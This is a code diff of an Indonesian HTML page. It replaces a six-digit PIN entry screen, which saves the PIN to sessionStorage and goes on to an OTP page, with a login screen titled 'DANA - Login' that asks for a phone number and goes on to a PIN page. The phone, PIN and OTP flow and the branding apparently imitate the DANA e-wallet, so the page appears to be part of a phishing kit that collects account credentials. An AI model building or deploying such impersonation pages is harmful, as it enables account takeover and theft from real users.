@@ -1,119 +1,90 @@
+
 <!DOCTYPE html>
 <html lang="id">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Masukkan PIN</title>
+  <title>DANA - Login</title>
   <style>
     body {
-      font-family: 'Segoe UI', Roboto, sans-serif;
-      background-color: #fff;
+      font-family: sans-serif;
       margin: 0;
+      background-color: #008CFF;
+      color: white;
+    }
+
+    .container {
+      padding: 20px;
+      text-align: center;
+    }
+
+    .input-group {
+      background-color: white;
+      color: black;
+      border-radius: 10px;
+      padding: 10px;
+      margin: 20px auto;
+      max-width: 300px;
       display: flex;
-      flex-direction: column;
-      height: 100vh;
-      justify-content: center;
+      gap: 10px;
       align-items: center;
     }
 
-    h2 {
-      margin-bottom: 8px;
+    .input-group input {
+      flex: 1;
+      border: none;
       font-size: 18px;
-      font-weight: 500;
-      color: #333;
+      outline: none;
     }
 
-    p {
-      margin-top: 0;
+    .button {
+      background-color: #e0e0e0;
       color: #888;
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 18px;
+      max-width: 300px;
+      margin: 20px auto;
+      cursor: pointer;
+      user-select: none;
+    }
+
+    .terms {
       font-size: 14px;
-      margin-bottom: 40px;
+      margin-top: 10px;
+      color: white;
+      max-width: 300px;
+      margin-left: auto;
+      margin-right: auto;
     }
 
-    .pin-wrapper {
-      display: flex;
-      gap: 14px;
-    }
-
-    .dot {
-      width: 16px;
-      height: 16px;
-      border: 1.8px solid #ccc;
-      border-radius: 50%;
-      background-color: #fff;
-      transition: background 0.2s ease;
-    }
-
-    .dot.filled {
-      background-color: #008CFF;
-      border-color: #008CFF;
-    }
-
-    input[type="password"] {
-      position: absolute;
-      opacity: 0;
-    }
-
-    .tap-anywhere {
-      font-size: 12px;
-      color: #aaa;
-      margin-top: 20px;
-    }
-
-    @media (max-width: 400px) {
-      .dot {
-        width: 12px;
-        height: 12px;
-      }
+    .terms a {
+      color: white;
+      font-weight: bold;
+      text-decoration: underline;
     }
   </style>
 </head>
 <body>
-  <h2>Masukkan PIN Anda</h2>
-  <p>PIN 6 digit untuk keamanan akun</p>
-
-  <div class="pin-wrapper" id="pinDots">
-    <div class="dot" id="dot0"></div>
-    <div class="dot" id="dot1"></div>
-    <div class="dot" id="dot2"></div>
-    <div class="dot" id="dot3"></div>
-    <div class="dot" id="dot4"></div>
-    <div class="dot" id="dot5"></div>
+  <div class="container">
+    <h2>Masukkan nomor HP kamu untuk lanjut</h2>
+    <div class="input-group">
+      <span>+62</span>
+      <input type="tel" id="phone" placeholder="811-1234-5678" />
+    </div>
+    <div class="button" onclick="goToPin()">LANJUTKAN</div>
+    <div class="terms">
+      Kami akan menggunakan nomor HP ini sebagai ID kamu dan untuk mengamankan akun kamu.
+      Dengan melanjutkan, kamu juga setuju dengan <a href="#">S&K</a> serta <a href="#">Kebijakan Privasi</a> kami.
+    </div>
   </div>
-
-  <input id="pinInput" type="password" inputmode="numeric" maxlength="6" autofocus>
-
-  <div class="tap-anywhere">(Ketuk layar untuk mengetik)</div>
-
   <script>
-    const pinInput = document.getElementById('pinInput');
-    const dots = [...document.querySelectorAll('.dot')];
-
-    document.body.addEventListener('click', () => {
-      pinInput.focus();
-    });
-
-    pinInput.addEventListener('input', () => {
-      const value = pinInput.value;
-      dots.forEach((dot, index) => {
-        if (index < value.length) {
-          dot.classList.add('filled');
-        } else {
-          dot.classList.remove('filled');
-        }
-      });
-
-      if (value.length === 6) {
-        sessionStorage.setItem('pin', value);
-        setTimeout(() => {
-          window.location.href = 'otp.html';
-        }, 300);
+    function goToPin() {
+      const phone = document.getElementById("phone").value;
+      if (phone.trim() !== "") {
+        window.location.href = "pin.html";
       }
-    });
-
-    window.onload = () => {
-      pinInput.focus();
-    };
+    }
   </script>
 </body>
-  </html>
+</html>
